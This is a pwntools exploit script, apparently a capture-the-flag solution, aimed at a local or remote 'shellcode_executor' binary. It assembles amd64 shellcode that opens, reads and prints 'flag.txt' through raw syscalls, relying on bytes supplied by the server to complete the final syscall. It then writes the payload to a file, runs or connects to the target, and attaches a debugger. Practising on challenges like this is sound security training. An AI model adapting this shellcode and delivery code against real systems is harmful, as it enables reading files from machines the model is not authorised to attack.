from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "build/shellcode_executor"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init(argv=None):
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(argv=[BINARY, argv])
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)


def make_shellcode(content):
    file_name = "shellcode.txt"
    with open(file_name, "wb") as f:
        f.write(content)
    return file_name


def local_test():
    pay = asm("""
    /* push b'flag.txt\x00' */
    mov dword ptr [rsp], 0x67616c66
    mov dword ptr [rsp+4], 0x7478742e
    mov byte ptr [rsp+8], 0
    /* call open('rsp', 'O_RDONLY', 0x64) */
    mov al, SYS_open /* 2 */
    mov rdi, rsp
    mov edx, 0x64
    mov esi, 0 /* O_RDONLY */
    syscall
    /* call read('rax', 'rsp', 'rdx') */
    mov edi, eax
    mov al, SYS_read
    mov rsi, rsp
    syscall
    /* call write(0, 'rsp', 'rax') */
    mov edx, eax
    mov al, SYS_write /* 1 */
    mov edi, 0
    mov rsi, rsp
    .byte 0x0f, 0x1f

    /* exit syscall from the server mov eax, 0x3c; syscall; */
    // .byte 0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05
    """
    )
    log.info(f"{hex(bytes_to_long(pay))[2:]=}")
    file_name = make_shellcode(pay)
    x, p = init(file_name)
    x.debug((
        "break *main+268\nc\n"
    ))
    p.interactive()

if __name__ == "__main__":
    local_test()
